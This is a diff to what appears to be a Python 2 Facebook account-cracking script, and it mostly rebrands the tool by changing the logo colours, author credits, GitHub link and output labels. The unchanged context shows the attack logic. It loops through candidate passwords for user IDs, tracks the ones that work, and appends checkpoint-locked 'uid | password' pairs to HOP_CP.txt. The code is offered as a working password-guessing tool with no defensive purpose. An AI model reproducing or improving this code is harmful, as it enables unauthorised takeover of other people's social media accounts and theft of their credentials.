@@ -40,12 +40,12 @@ os.system('clear')
 logo = """
 \033[1;97m █████  \033[1;91m██      \033[1;97m██ 
 \033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
-\033[1;97m███████ \033[1;91m██      \033[1;97m██ 
+\033[1;92m███████ \033[1;92m██      \033[1;92m██ 
 \033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
 \033[1;97m██   ██ \033[1;91m███████ \033[1;97m██
 \033[1;91m-----------------------------------------------
-\033[1;97m➣ Author : Jam Shahrukh x Xtylo Ali Raza
-\033[1;97m➣ Github : https://github.com/Stylish-Queen
+\033[1;97m➣ Author : Xtylo Ali Raza x Ayesha Ali
+\033[1;97m➣ Github : https://github.com/Xtylo-x-Ayesha
 \033[1;97m➣ Fb Page: Jam Shahrukh Official
 \033[1;91m-----------------------------------------------"""
 
@@ -491,7 +491,7 @@ def a_s():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;93m[XTYLO-CP] ' + uid + ' | ' + pass1
+                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -507,7 +507,7 @@ def a_s():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;93m[XTYLO-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -522,7 +522,7 @@ def a_s():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[XTYLO-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -537,7 +537,7 @@ def a_s():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[XTYLO-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass4
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -552,7 +552,7 @@ def a_s():
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[XTYLO-CP] ' + uid + ' | ' + pass5
+                                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass5
                                 cp = open('HOP_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
